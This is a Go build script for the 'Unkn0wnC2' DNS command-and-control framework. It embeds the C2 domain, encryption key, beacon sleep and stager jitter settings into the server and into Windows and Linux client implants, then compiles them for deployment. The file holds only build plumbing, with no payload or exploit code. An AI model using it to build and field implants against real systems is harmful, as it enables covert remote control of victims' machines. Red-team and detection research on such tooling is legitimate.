// Package main implements the build tool for the Unkn0wnC2 DNS C2 framework.
// This tool consolidates configuration management and creates production-ready
// binaries with embedded configuration for all supported platforms.
package main

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

// BuildConfig represents the master build configuration
type BuildConfig struct {
	Project struct {
		Name        string `json:"name"`
		Version     string `json:"version"`
		Description string `json:"description"`
	} `json:"project"`
	Server struct {
		BindAddr      string `json:"bind_addr"`
		BindPort      int    `json:"bind_port"`
		ServerAddress string `json:"server_address"`
		Domain        string `json:"domain"`
		NS1           string `json:"ns1"`
		NS2           string `json:"ns2"`
		ForwardDNS    bool   `json:"forward_dns"`
		UpstreamDNS   string `json:"upstream_dns"`
		Debug         bool   `json:"debug"`
	} `json:"server"`
	Client struct {
		ServerDomain     string `json:"server_domain"`
		DNSServer        string `json:"dns_server"`
		QueryType        string `json:"query_type"`
		Encoding         string `json:"encoding"`
		Timeout          int    `json:"timeout"`
		MaxCommandLength int    `json:"max_command_length"`
		RetryAttempts    int    `json:"retry_attempts"`
		SleepMin         int    `json:"sleep_min"`
		SleepMax         int    `json:"sleep_max"`
	} `json:"client"`
	Stager struct {
		JitterMinMs       int `json:"jitter_min_ms"`
		JitterMaxMs       int `json:"jitter_max_ms"`
		ChunksPerBurst    int `json:"chunks_per_burst"`
		BurstPauseMs      int `json:"burst_pause_ms"`
		RetryDelaySeconds int `json:"retry_delay_seconds"`
		MaxRetries        int `json:"max_retries"`
	} `json:"stager"`
	Security struct {
		EncryptionKey string `json:"encryption_key"`
	} `json:"security"`
	Build struct {
		OutputDir string `json:"output_dir"`
		Targets   struct {
			Server struct {
				Linux struct {
					Enabled bool   `json:"enabled"`
					Output  string `json:"output"`
				} `json:"linux"`
			} `json:"server"`
			Client struct {
				Windows struct {
					Enabled bool   `json:"enabled"`
					Output  string `json:"output"`
				} `json:"windows"`
				Linux struct {
					Enabled bool   `json:"enabled"`
					Output  string `json:"output"`
				} `json:"linux"`
			} `json:"client"`
		} `json:"targets"`
	} `json:"build"`
}

func main() {
	fmt.Println("=== Unkn0wnC2 Build Tool ===")

	// Load build configuration
	config, err := loadBuildConfig()
	if err != nil {
		fmt.Printf("Error loading build config: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("Building %s v%s\n", config.Project.Name, config.Project.Version)
	fmt.Printf("Description: %s\n", config.Project.Description)
	fmt.Println()

	// Create build directory
	buildDir := config.Build.OutputDir
	if err := os.MkdirAll(buildDir, 0755); err != nil {
		fmt.Printf("Error creating build directory: %v\n", err)
		os.Exit(1)
	}

	// Generate server configuration
	if err := generateServerConfig(config); err != nil {
		fmt.Printf("Error generating server config: %v\n", err)
		os.Exit(1)
	}

	// Generate client configuration
	if err := generateClientConfig(config); err != nil {
		fmt.Printf("Error generating client config: %v\n", err)
		os.Exit(1)
	}

	// Build server
	if config.Build.Targets.Server.Linux.Enabled {
		if err := buildServer(config, "linux", "amd64", config.Build.Targets.Server.Linux.Output); err != nil {
			fmt.Printf("Error building Linux server: %v\n", err)
			os.Exit(1)
		}
	}

	// Build clients
	if config.Build.Targets.Client.Windows.Enabled {
		if err := buildClient(config, "windows", "amd64", config.Build.Targets.Client.Windows.Output); err != nil {
			fmt.Printf("Error building Windows client: %v\n", err)
			os.Exit(1)
		}
	}

	if config.Build.Targets.Client.Linux.Enabled {
		if err := buildClient(config, "linux", "amd64", config.Build.Targets.Client.Linux.Output); err != nil {
			fmt.Printf("Error building Linux client: %v\n", err)
			os.Exit(1)
		}
	}

	// Generate deployment info
	if err := generateDeploymentInfo(config); err != nil {
		fmt.Printf("Error generating deployment info: %v\n", err)
		os.Exit(1)
	}

	fmt.Println("\n=== Build Complete ===")
	fmt.Printf("Output directory: %s\n", buildDir)
	fmt.Println("Built binaries:")

	if config.Build.Targets.Server.Linux.Enabled {
		fmt.Printf("  - %s (Linux Server)\n", config.Build.Targets.Server.Linux.Output)
	}
	if config.Build.Targets.Client.Windows.Enabled {
		fmt.Printf("  - %s (Windows Client)\n", config.Build.Targets.Client.Windows.Output)
	}
	if config.Build.Targets.Client.Linux.Enabled {
		fmt.Printf("  - %s (Linux Client)\n", config.Build.Targets.Client.Linux.Output)
	}

	fmt.Println("  - deployment_info.json (Configuration Summary)")
	fmt.Println("\nReady for deployment!")
}

func loadBuildConfig() (*BuildConfig, error) {
	data, err := os.ReadFile("build_config.json")
	if err != nil {
		return nil, fmt.Errorf("reading build_config.json: %w", err)
	}

	var config BuildConfig
	if err := json.Unmarshal(data, &config); err != nil {
		return nil, fmt.Errorf("parsing build_config.json: %w", err)
	}

	return &config, nil
}

func generateServerConfig(config *BuildConfig) error {
	fmt.Println("Generating server configuration...")

	// Read the existing config.go to find and replace the tryLoadEmbeddedConfig function
	configPath := "Server/config.go"
	configContent, err := os.ReadFile(configPath)
	if err != nil {
		return fmt.Errorf("reading config.go: %w", err)
	}

	// Create the replacement function with embedded values
	embeddedConfigFunc := fmt.Sprintf(`// tryLoadEmbeddedConfig attempts to load embedded configuration
// Returns the config and true if embedded config is available, otherwise returns empty config and false
func tryLoadEmbeddedConfig() (Config, bool) {
	// Embedded configuration from build time
	embeddedConfig := Config{
		BindAddr:      %q,
		BindPort:      %d,
		SvrAddr:       %q,
		Domain:        %q,
		NS1:           %q,
		NS2:           %q,
		ForwardDNS:    %t,
		UpstreamDNS:   %q,
		EncryptionKey: %q,
		Debug:         %t,
		StagerJitter: StagerJitter{
			JitterMinMs:       %d,
			JitterMaxMs:       %d,
			ChunksPerBurst:    %d,
			BurstPauseMs:      %d,
			RetryDelaySeconds: %d,
			MaxRetries:        %d,
		},
	}
	return embeddedConfig, true
}`,
		config.Server.BindAddr,
		config.Server.BindPort,
		config.Server.ServerAddress,
		config.Server.Domain,
		config.Server.NS1,
		config.Server.NS2,
		config.Server.ForwardDNS,
		config.Server.UpstreamDNS,
		config.Security.EncryptionKey,
		config.Server.Debug,
		config.Stager.JitterMinMs,
		config.Stager.JitterMaxMs,
		config.Stager.ChunksPerBurst,
		config.Stager.BurstPauseMs,
		config.Stager.RetryDelaySeconds,
		config.Stager.MaxRetries,
	)

	// Replace the stub function in config.go
	configStr := string(configContent)

	// Find the existing tryLoadEmbeddedConfig function and replace it
	startPattern := "func tryLoadEmbeddedConfig() (Config, bool) {"

	start := strings.Index(configStr, startPattern)
	if start == -1 {
		return fmt.Errorf("could not find tryLoadEmbeddedConfig function in config.go")
	}

	// Find the matching closing brace for this function
	braceCount := 0
	pos := start
	functionStart := pos

	// Find opening brace
	for pos < len(configStr) && configStr[pos] != '{' {
		pos++
	}
	if pos >= len(configStr) {
		return fmt.Errorf("could not find opening brace of tryLoadEmbeddedConfig function")
	}
	pos++ // Move past the opening brace
	braceCount = 1

	// Find matching closing brace
	for pos < len(configStr) && braceCount > 0 {
		if configStr[pos] == '{' {
			braceCount++
		} else if configStr[pos] == '}' {
			braceCount--
		}
		pos++
	}

	if braceCount > 0 {
		return fmt.Errorf("could not find matching closing brace for tryLoadEmbeddedConfig function")
	}

	// Find the start of the comment before the function
	commentStart := functionStart
	for commentStart > 0 && configStr[commentStart-1] != '\n' {
		commentStart--
	}
	// Look for the comment lines before the function
	for commentStart > 0 {
		lineStart := commentStart
		for lineStart > 0 && configStr[lineStart-1] != '\n' {
			lineStart--
		}
		line := strings.TrimSpace(configStr[lineStart:commentStart])
		if strings.HasPrefix(line, "//") {
			commentStart = lineStart
		} else {
			break
		}
	}

	end := pos

	// Replace the function
	newConfigStr := configStr[:start] + embeddedConfigFunc + configStr[end:]

	return os.WriteFile(configPath, []byte(newConfigStr), 0644)
}

func generateClientConfig(config *BuildConfig) error {
	fmt.Println("Generating client configuration...")

	clientConfig := fmt.Sprintf(`package main

// This file is auto-generated at build time
// DO NOT EDIT MANUALLY

// embeddedConfig contains the configuration embedded at build time
var embeddedConfig = Config{
	ServerDomain:     %q,
	DNSServer:        %q,
	QueryType:        %q,
	Encoding:         %q,
	EncryptionKey:    %q,
	Timeout:          %d,
	MaxCommandLength: %d,
	RetryAttempts:    %d,
	SleepMin:         %d,
	SleepMax:         %d,
}

// getConfig returns the embedded configuration
func getConfig() Config {
	return embeddedConfig
}
`,
		config.Client.ServerDomain,
		config.Client.DNSServer,
		config.Client.QueryType,
		config.Client.Encoding,
		config.Security.EncryptionKey,
		config.Client.Timeout,
		config.Client.MaxCommandLength,
		config.Client.RetryAttempts,
		config.Client.SleepMin,
		config.Client.SleepMax,
	)

	return os.WriteFile("Client/config.go", []byte(clientConfig), 0644)
}

func buildServer(config *BuildConfig, goos, goarch, output string) error {
	fmt.Printf("Building server for %s/%s...\n", goos, goarch)

	// Create absolute path for output
	outputPath, err := filepath.Abs(filepath.Join(config.Build.OutputDir, output))
	if err != nil {
		return fmt.Errorf("creating output path: %w", err)
	}

	cmd := exec.Command("go", "build", "-o", outputPath, ".")
	cmd.Dir = "Server"
	cmd.Env = append(os.Environ(),
		fmt.Sprintf("GOOS=%s", goos),
		fmt.Sprintf("GOARCH=%s", goarch),
	)

	if cmdOutput, err := cmd.CombinedOutput(); err != nil {
		return fmt.Errorf("go build failed: %w\nOutput: %s", err, cmdOutput)
	}

	fmt.Printf("✓ Built %s server: %s\n", goos, output)
	return nil
}

func buildClient(config *BuildConfig, goos, goarch, output string) error {
	fmt.Printf("Building client for %s/%s...\n", goos, goarch)

	// Create absolute path for output
	outputPath, err := filepath.Abs(filepath.Join(config.Build.OutputDir, output))
	if err != nil {
		return fmt.Errorf("creating output path: %w", err)
	}

	cmd := exec.Command("go", "build", "-o", outputPath, ".")
	cmd.Dir = "Client"
	cmd.Env = append(os.Environ(),
		fmt.Sprintf("GOOS=%s", goos),
		fmt.Sprintf("GOARCH=%s", goarch),
	)

	if cmdOutput, err := cmd.CombinedOutput(); err != nil {
		return fmt.Errorf("go build failed: %w\nOutput: %s", err, cmdOutput)
	}

	fmt.Printf("✓ Built %s client: %s\n", goos, output)
	return nil
}

func generateDeploymentInfo(config *BuildConfig) error {
	fmt.Println("Generating deployment information...")

	deployInfo := map[string]interface{}{
		"project":         config.Project,
		"build_timestamp": time.Now().Unix(),
		"build_host":      fmt.Sprintf("%s/%s", runtime.GOOS, runtime.GOARCH),
		"server_config": map[string]interface{}{
			"domain":      config.Server.Domain,
			"ns1":         config.Server.NS1,
			"ns2":         config.Server.NS2,
			"bind_port":   config.Server.BindPort,
			"forward_dns": config.Server.ForwardDNS,
		},
		"client_config": map[string]interface{}{
			"server_domain":  config.Client.ServerDomain,
			"query_type":     config.Client.QueryType,
			"encoding":       config.Client.Encoding,
			"sleep_interval": fmt.Sprintf("%d-%d seconds", config.Client.SleepMin, config.Client.SleepMax),
		},
		"security": map[string]interface{}{
			"encryption":     "AES-GCM with Base36 encoding",
			"key_configured": len(config.Security.EncryptionKey) > 0,
		},
		"binaries": []map[string]string{},
	}

	// Add binary information
	binaries := []map[string]string{}
	if config.Build.Targets.Server.Linux.Enabled {
		binaries = append(binaries, map[string]string{
			"type":     "server",
			"platform": "linux/amd64",
			"filename": config.Build.Targets.Server.Linux.Output,
		})
	}
	if config.Build.Targets.Client.Windows.Enabled {
		binaries = append(binaries, map[string]string{
			"type":     "client",
			"platform": "windows/amd64",
			"filename": config.Build.Targets.Client.Windows.Output,
		})
	}
	if config.Build.Targets.Client.Linux.Enabled {
		binaries = append(binaries, map[string]string{
			"type":     "client",
			"platform": "linux/amd64",
			"filename": config.Build.Targets.Client.Linux.Output,
		})
	}
	deployInfo["binaries"] = binaries

	data, err := json.MarshalIndent(deployInfo, "", "  ")
	if err != nil {
		return fmt.Errorf("marshaling deployment info: %w", err)
	}

	return os.WriteFile(filepath.Join(config.Build.OutputDir, "deployment_info.json"), data, 0644)
}
